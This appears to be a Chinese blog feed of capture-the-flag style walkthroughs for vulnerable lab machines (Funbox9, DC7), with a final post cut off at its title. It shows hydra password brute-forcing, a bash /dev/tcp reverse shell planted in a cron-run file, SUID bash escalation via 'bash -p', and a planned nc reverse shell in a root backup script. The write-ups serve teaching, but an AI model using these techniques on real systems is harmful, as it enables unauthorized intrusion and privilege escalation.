<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ftp anonymous@192.168.179.139</span></span><br><span class="line">Connected <span class="built_in">to</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span><span class="number">.5</span>e Server (Debian) [::ffff:<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>]</span><br><span class="line"><span class="number">331</span> Anonymous login ok, <span class="built_in">send</span> your complete email address <span class="keyword">as</span> your password</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span>-Welcome, archive user anonymous@<span class="number">192.168</span><span class="number">.179</span><span class="number">.83</span> !</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-The <span class="built_in">local</span> <span class="built_in">time</span> is: Sun Feb <span class="number">09</span> <span class="number">10</span>:<span class="number">23</span>:<span class="number">22</span> <span class="number">2025</span></span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-This is <span class="keyword">an</span> experimental FTP server.  If you have <span class="keyword">any</span> unusual problems,</span><br><span class="line"><span class="number">230</span>-please report them via e-mail <span class="built_in">to</span> &lt;sky@funbox9&gt;.</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span> Anonymous access granted, restrictions apply</span><br><span class="line">Remote <span class="keyword">system</span> type is UNIX.</span><br><span class="line">Using binary mode <span class="built_in">to</span> transfer <span class="built_in">files</span>.</span><br><span class="line"><span class="keyword">ftp</span>&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">8782</span>|)</span><br><span class="line"><span class="number">150</span> Opening ASCII mode data connection <span class="keyword">for</span> <span class="built_in">file</span> list</span><br><span class="line">-rw-r<span class="comment">--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg</span></span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="keyword">ftp</span>&gt; <span class="built_in">get</span> welcome.msg</span><br><span class="line"><span class="built_in">local</span>: welcome.msg remote: welcome.msg</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">51553</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY mode data connection <span class="keyword">for</span> welcome.msg (<span class="number">169</span> <span class="keyword">bytes</span>)</span><br><span class="line"><span class="number">100</span>% |********************************************************************|   <span class="number">169</span>       <span class="number">31.01</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="number">169</span> <span class="keyword">bytes</span> received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">14.47</span> KiB/s)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat welcome.msg                                  </span><br><span class="line">Welcome, archive <span class="keyword">user</span> %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="keyword">local</span> <span class="type">time</span> <span class="keyword">is</span>: %T</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> an experimental FTP <span class="keyword">server</span>.  <span class="keyword">If</span> you have <span class="keyword">any</span> unusual problems,</span><br><span class="line">please report them via e-mail <span class="keyword">to</span> &lt;sky@%L&gt;.</span><br></pre></td></tr></table></figure></div>
<p>这出现了两个疑似用户的东西，尝试ftp登录看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp <span class="variable">%U</span>@<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp user<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span> </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for user</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp sky@<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span></span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp sky<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for sky</span><br><span class="line">Password: </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>尝试一下，发现可能有user 和 sky用户，用hydra爆破一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l sky -P /usr/<span class="keyword">share</span>/wordlists/rockyou.txt ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span> </span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">46</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>:<span class="number">21</span>/</span><br><span class="line">[STATUS] <span class="number">295.00</span> tries/min, <span class="number">295</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344106</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">810</span>:<span class="number">25</span>h, <span class="number">14</span> active</span><br><span class="line">[<span class="number">21</span>][ftp] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>   <span class="keyword">login</span>: sky   <span class="keyword">password</span>: thebest</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">43</span>:<span class="number">31</span></span><br></pre></td></tr></table></figure></div>
<p>成功得到sky用户的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 66 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line">ftp&gt; cat user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||8837|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag (66 bytes)</span><br><span class="line">100% |********************************************************************|   <span class="number"> 66 </span>       1.67 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br></pre></td></tr></table></figure></div>
<p>有个userflag，而且这个sarah是组成员，看看user flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat user.flag                                    </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">echo <span class="string">&quot;Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这个flag不是base64，但是这个user.flag不是一个简单的文本，它是一个sh脚本<br>所以肯定要用这个文件,我现在接触的sh脚本自己用的只有用来反弹shell,那我们就在ftp中上传反弹shell脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat reverse.sh </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line">ftp&gt; put reverse.sh</span><br><span class="line">local: reverse.sh remote: reverse.sh</span><br><span class="line">229 Entering Extended Passive Mode (|||58762|)</span><br><span class="line">150 Opening BINARY mode data connection for reverse.sh</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    45      255.49 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">45 bytes sent in 00:00 (6.58 KiB/s)</span><br><span class="line">ftp&gt; mv reverse.sh user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>发现在ftp中没法重命名，我们就在本机改名上传</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat user.flag </span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">ftp&gt; put user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||34801|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag</span><br><span class="line">100% |********************************************************************|   <span class="number"> 55 </span>     383.64 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">55 bytes sent in 00:00 (5.41 KiB/s)</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||62805|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Feb <span class="number"> 9 </span>11:04 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>sky      sky           <span class="number"> 45 </span>Feb <span class="number"> 9 </span>11:04 reverse.sh</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 55 </span>Feb <span class="number"> 9 </span>11:06 user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>成功上传，然后在本地监听，得到shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.4$ id</span><br><span class="line"><span class="attribute">uid</span>=1002(sarah) <span class="attribute">gid</span>=1002(sarah) <span class="attribute">groups</span>=1002(sarah)</span><br><span class="line">bash-4.4$ </span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在这里我卡了很久。<br>先看了一下sudo，但是sudo要密码<br>再查一下suid，我看这里都是&#x2F;bin目录下的，随便选了几个去gtfobins搜了一下就没管了<br>我的思路是首先先用pspy64看一下定时任务<br>我发现了这user.flag是一个定时程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2</span>      | </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init maybe-ubiquity </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27586</span>  | bash -i /home/sky/user.flag </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">1002</span>  PID=<span class="number">27585</span>  | /bin/sh -c bash -i /home/sky/user.flag &gt; /dev/null </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27584</span>  | /usr/sbin/CRON -f </span><br></pre></td></tr></table></figure></div>
<p>我就想着是这个定时任务里面有uid&#x3D;0的，而且执行了bash -i &#x2F;home&#x2F;sky&#x2F;user.flag<br>这难道是root也会执行这个定时任务？下面是sarah执行的这个任务，我拿到了sarah的shell<br>但是我在kali里面nc -lp 1234 了好几遍，都是返回sarah的shell。<br>后面经过群主提醒，这个bash的PS1有问题<br>在 Linux 中，PS1（Prompt String 1）是一个环境变量，用来定义 shell 命令提示符的显示内容和格式。一般普通用户的PS1以$结尾，root的以#结尾<br>在这个靶机中的PS1是<code>bash-4.2$</code>，没有显示路径，用户名，说明是一个受限的bash<br>所以用<code>bash -p</code>这个指令就可以得到root的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">^X-su-<span class="number">4.4</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/bin/bash</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/procmail</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newuidmap</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/pkexec</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/policykit</span>-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/x86_64-linux-gnu/lxc</span><span class="regexp">/lxc-user-nic</span></span><br><span class="line"><span class="regexp">-su-4.4$ /bin</span><span class="regexp">/bash</span></span><br><span class="line"><span class="regexp">bash-4.4$ bash -p</span></span><br><span class="line"><span class="regexp">bash-4.4# id</span></span><br><span class="line"><span class="regexp">uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)</span></span><br></pre></td></tr></table></figure></div>
<p>所以这个&#x2F;bin&#x2F;bash有suid是可以利用的，我直接忽略了。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">-p（privileged mode，特权模式）：</span><br><span class="line">默认情况下，Bash 在以 SUID（<span class="keyword">Set</span>-User-ID）或 SGID（<span class="keyword">Set</span>-Group-ID）方式执行时，会自动丢弃 euid 并降权到 <span class="comment">ruid</span> 以避免安全问题。</span><br><span class="line">但是，使用 bash <span class="comment">-p</span> 可以尝试保留 <span class="comment">euid</span>，从而继续以提升的权限运行 <span class="comment">Bash</span>（如果系统允许）。</span><br></pre></td></tr></table></figure></div>
<p>另外刚才那个定时任务为什么有root的身份执行的行呢？ 原因是这样的：如果拿apache服务举例，发现运行这个服务的不止有www-data的还有root，为什么每次拿到的shell都是www-data的呢？因为root只是负责服务的初始化等内容，这个服务还是归www-data所有的。<br>在这里也是，这个user.flag文件就是由sarah用户执行的。<br>现在我们在root的身份下可以去定时任务里面看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">bash-<span class="number">4.4</span><span class="comment"># pwd       </span></span><br><span class="line"><span class="regexp">/var/</span>spool<span class="regexp">/cron/</span>crontabs</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># ls</span></span><br><span class="line">sarah</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># cat sarah </span></span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (/tmp/crontab.A5TLWA/crontab installed on Sun Jun  6 13:52:29 2021)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line">*<span class="regexp">/1	*	*	*	*	bash -i /</span>home<span class="regexp">/sky/u</span>ser.flag &gt; <span class="regexp">/dev/</span>null</span><br></pre></td></tr></table></figure></div>
<p>所以这个任务就是只有sarah这个用户执行的。<br>最后我还从群主ll104567那学到了一个东西，我一直都不知道，叫<code>linpeas.sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">linPEAS</span> 是一个用于 Linux 系统的特权提升脚本套件，旨在帮助进行后渗透测试时进行系统枚举和发现特权提升路径。 系统枚举：linPEAS 收集系统的广泛信息，包括用户、组、进程、网络配置、安装的软件等。 特权提升检测：它检查常见的配置错误和漏洞，这些漏洞可能允许攻击者在系统上提升其权限。</span><br></pre></td></tr></table></figure></div>
<p>运行这个程序之后也能发现bash有可以提权的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">6(CVE-2011-1485)</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>root   root       1.1M Jun <span class="number"> 6 </span><span class="number"> 2019 </span>/bin/bash</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root   root        19K Jun<span class="number"> 28 </span><span class="number"> 2019 </span>/usr/bin/traceroute6.iputils</span><br></pre></td></tr></table></figure></div>
<p>运行程序之后这个&#x2F;bin&#x2F;bash是黄底红色的。</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC7靶场复盘</title>
    <url>/posts/51728.html</url>
    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
<span id="more"></span>
<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Learn2Code</title>
    <url>/posts/963.html</url>
    <content><![CDATA[<p>HMV-Learn2Code靶机复盘 </p>
<span id="more"></span>
